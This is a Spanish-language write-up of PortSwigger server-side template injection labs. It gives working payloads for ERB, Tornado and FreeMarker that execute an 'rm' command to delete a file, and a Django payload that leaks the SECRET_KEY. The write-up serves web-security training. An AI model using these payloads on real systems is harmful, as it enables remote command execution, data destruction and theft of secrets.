---
title: SSTI | PortSwigger
---
Labs de Server Side Template Injection hechos y explicados.

### Laboratorio: Inyección básica de plantillas en el servidor

```
# Investigando la pagina, vemos que algunos productos presentan el mensaje de que no estan disponible, pero en el formato: 
message=Unfortunately this product is out of stock
# entonces si ponemos message = <%= 7*7 %> Vemos por pantalla nos saca 49.
# Por lo tnato, podemos ejecutar comandos usando la template de ruby:
<%= system("rm /home/carlos/morale.txt") %>
# Y ya podremos eliminar el archivo morale.txt
```

### Laboratorio: Inyección básica de plantillas del lado del servidor (contexto de código)

```
# Probando, vemos que la parte de blog-post-author-display en el burp es vulnerable a SSTI.
# Esto se debe a que las expresiones en tornado están entre {{}}. Por ende, podemos escapar los brackets para ejecutar el comando que queramos. 
# Para ello, yo he introducido el siguiente payload:
user.name}}{% import os %}{{ os.popen("rm /home/carlos/morale.txt").read() }}
```

### Laboratorio Inyección de plantillas del lado del servidor mediante documentación

```
# Probando SSTI, vemos que nos coge ${7*7}, que es una SSTI de Java. No obstante, si probamos a inyectar un comando, nos tira un error en el que podemos ver claramente como pone FreeMarker, así que investigando vemos que para ejecutar comandos dentro de este template tenemos que usar:

<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("rm /home/carlos/morale.txt")}
```

### Laboratorio Inyección de plantillas del lado del servidor en un lenguaje desconocido con un exploit documentado

```
# Probando SSTI, vemos como estamos ante un Handlebars template de Java, el cual tiene el siguiente payload:
https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection
```

### Laboratorio Inyección de plantillas en el servidor con revelación de información mediante objetos suministrados por el usuario

```
# Probando payloads, vemos que estamos ante django. Por lo tanto, vamos a meterle este payload para sacar la secret key:
{{settings.SECRET_KEY}}
```